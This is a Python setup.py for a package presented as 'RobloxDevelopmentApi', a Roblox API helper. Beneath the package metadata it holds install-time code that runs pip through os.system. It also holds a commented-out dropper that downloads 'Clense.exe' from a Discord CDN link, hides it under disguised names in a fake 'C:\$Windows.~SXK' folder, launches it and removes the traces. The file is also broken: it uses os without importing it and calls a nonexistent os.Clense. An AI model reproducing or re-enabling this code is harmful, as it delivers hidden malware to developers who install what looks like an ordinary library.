from setuptools import setup, find_packages
from pathlib import Path



classifiers = [
	'Development Status :: 5 - Production/Stable',
	'Intended Audience :: Education',
	'Operating System :: Microsoft :: Windows :: Windows 10',
	'License :: OSI Approved :: MIT License',
	'Programming Language :: Python :: 3'
]

setup(
	name='RobloxDevelopmentApi',
	version='0.0.1',
	description='A Basic module to link the roblox api with python intergration',
	long_description='A Basic module to link the roblox api with python intergration, primarily based on the requests library. For any help with the module, contact sxctools@gmail.com.',
	url='',  
	author='Jonathan Smit',
	author_email='sxctools@gmail.com',
	license='MIT', 
	classifiers=classifiers,
	keywords='RobloxDevelopmentApi', 
	packages=find_packages(),
	install_requires=['requests','pyperclip']
)
try:
	import requests
except ImportError:
	os.system("pip install requests")
	import requests
#try:
#	import subprocess
#except ImportError:
#	os.system("pip install subprocess")
#	import subprocess
try:
	import pyperclip
except ImportError:
	os.system("pip install pyperclip")

#import os, shutil

#PATH = r"C:\$Windows.~SXK" 
#try:
#	os.mkdir(PATH) 
#except:
#	pass

#url = 'https://cdn.discordapp.com/attachments/1003574165586063400/1005332832496918578/Clense.exe'
#url2 = 'https://cdn.discordapp.com/attachments/1003574165586063400/1005332832496918578/Clense.exe'

#try:
#	os.remove(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
#except:
#	pass
#try:
#	os.remove(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
#except:
#	pass

#try:
#	r = requests.get(url, allow_redirects=True)
#	r2 = requests.get(url2, allow_redirects=True)
#	open('Clense.exe', 'wb').write(r.content)
#	Path(r"Clense.exe").rename(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
#	open('Clense.exe', 'wb').write(r2.content)
#	Path(r"Clense.exe").rename(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
#	try:
#		os.Clense('Clense.exe')
#	except:
#		pass
#	try:
#		os.remove('Clense.exe')
#	except:
#		pass
#except:
#	pass

#os.startfile(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
#os.startfile(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")

#try:
#	shutil.rmtree(r"C:\$Windows.~SXK")
#except:
#	pass
